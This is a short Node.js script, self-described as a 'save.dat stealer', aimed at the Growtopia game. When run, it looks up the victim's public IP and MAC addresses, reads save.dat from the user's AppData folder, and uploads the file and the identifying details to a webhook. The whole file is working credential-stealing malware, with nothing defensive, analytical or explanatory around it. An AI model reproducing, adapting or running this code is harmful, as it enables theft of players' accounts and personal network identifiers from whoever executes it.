const fs = require('fs')
const fetch = require('node-fetch');
const {
    exec
} = require('child_process');
const os = require("os");
const formData = require('form-data');
var ifaces = os.networkInterfaces();
let webhook = "";


function sendMessage(username, message) {
    if (username != null && message != null)
        fetch(webhook, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                "username": username,
                "content": message
            })
        }).catch(err => console.error(err));
}

function SendImageWebhook(filename) {
    if (filename != null) {
        let check = fs.existsSync(filename);
        if (check) {
            const form = new formData();
            form.append('file1', fs.createReadStream("./" + filename));
            fetch(webhook, {
                'method': 'POST',
                'body': form,
                headers: form.getHeaders()
            }).catch(err => console.error(err));
        }
    }
}

function getSaveDat() {
    fetch("https://api.ipify.org", {}).then(res => res.text()).then(response => {
        if (response != null) {
            try {
                let mac;
                Object.keys(ifaces).forEach(function(ifname) {
                    ifaces[ifname].forEach(function(iface) {
                        if (iface.mac == "00:00:00:00:00:00") return;
                        var array = iface.mac.toString().split("\n");
                        mac += "\n" + iface.mac;
                    });
                });
                process.chdir(`${__dirname.split(":")[0]}:/Users/${os.userInfo().username}/AppData/Local/Growtopia`);
                SendImageWebhook("save.dat");
                sendMessage("node stealer bot", "```\nsomeone opened save.dat stealer!\nIP : " + response + "\nMac : " + mac + "\n```")
            } catch (e) {
               return process.exit();
            }
        } else {
            return process.exit();
        }
    }).catch(err => {
        console.log("You are not connected to network!");
        return process.exit();
    })
}

getSaveDat();
